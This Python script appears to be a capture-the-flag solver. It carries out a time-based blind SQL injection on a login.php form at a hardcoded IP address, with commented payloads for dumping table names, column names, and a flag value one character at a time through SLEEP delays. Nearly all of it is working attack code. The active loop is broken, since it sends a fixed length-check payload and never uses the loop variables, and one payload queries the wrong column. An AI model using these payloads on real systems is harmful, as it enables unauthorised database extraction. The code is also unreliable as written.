# coding=utf-8

import requests

url="http://123.206.31.85:49165/login.php"
flag=""

#data = 11'  and (case when (length((select group_concat(table_name) from information_schema.tables where table_name=database()))=14) then sleep(4) else 1 end)) #
#爆表名 长度为14
#data = "11'and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from " + str(i) + " for 1 )='" + str1 + "') then sleep(4) else 1 end )) #"
#client_ip,flag

#data = 11'  and (case when (length((select group_concat(column_name) from information_schema.columns where table_name='flag'))=4) then sleep(4) else 1 end)) #
#爆字段 长度为4
#data = "11' and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from " + str(i) + " for 1 )='" + str1 + "') then sleep(4) else 1 end )) #"
#flag

#data = 11'  and (case when (length((select group_concat(flag) from flag))=32) then sleep(4) else 1 end)) #
#爆内容 长度为32
#data = "11' and (case when (substr((select group_concat(flag) from flag) from " + str(i) + " for 1 )='" + str1 + "') then sleep(4) else 1 end )) #"

for i in range(1,33):
    for str1 in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&*.":
        data = "11'  and (case when (length((select group_concat(table_name) from information_schema.tables where table_name=database()))=14) then sleep(4) else 1 end)) #"
        # print data
        post = {"username":data,"password":'123456'}
        try:
            result = requests.post(url, post, timeout=3)
        except requests.exceptions.ReadTimeout as e:
            flag += str1
            print(flag)
            break
print('flag:' + flag)

